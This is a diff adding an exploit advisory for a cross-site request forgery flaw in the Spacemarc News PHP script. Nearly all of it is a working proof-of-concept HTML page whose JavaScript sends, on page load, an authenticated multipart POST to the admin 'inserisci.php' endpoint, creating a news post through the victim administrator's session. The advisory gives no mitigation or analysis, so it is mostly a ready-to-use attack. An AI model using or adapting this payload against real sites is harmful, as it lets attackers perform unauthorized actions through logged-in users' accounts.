@@ -1,0 +1,94 @@
+# Exploit Title :              Spacemarc News - Cross-Site Request
+Forgery ( Add New Post)
+# Author :                     Besim
+# Google Dork :                 -
+# Date :                       10/10/2016
+# Type :                       webapps
+# Platform :                   PHP
+# Vendor Homepage :   http://www.spacemarc.it
+# Software link :
+ http://www.hotscripts.com/listings/jump/download/107255
+
+
+*########################### CSRF PoC ###############################*
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://site_name/news/admin/inserisci.php", true);
+        xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data;boundary=---------------------------7815509202030471153167006625");
+        xhr.withCredentials = true;
+        var body ="-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"titolo\"\r\n" +
+          "\r\n" +
+          "MavilerTester\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"im\"\r\n" +
+          "\r\n" +
+          "IM\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"size\"\r\n" +
+          "\r\n" +
+          "Normale\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"color\"\r\n" +
+          "\r\n" +
+          "Color\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"helpbox\"\r\n" +
+          "\r\n" +
+          "[u]text[/u]\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"testo\"\r\n" +
+          "\r\n" +
+          "tester\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"immagine\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"userfile\";filename=\"\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"letture\"\r\n" +
+          "\r\n" +
+          "0\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"categoria\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"abilita_commenti\"\r\n" +
+          "\r\n" +
+          "on\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"notifica_commenti\"\r\n"+
+          "\r\n" +
+          "on\r\n" +
+          "-----------------------------7815509202030471153167006625\r\n" +
+          "Content-Disposition: form-data; name=\"submit\"\r\n" +
+          "\r\n" +
+          "Inserisci\r\n" +
+          "-----------------------------7815509202030471153167006625--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+*####################################################################*
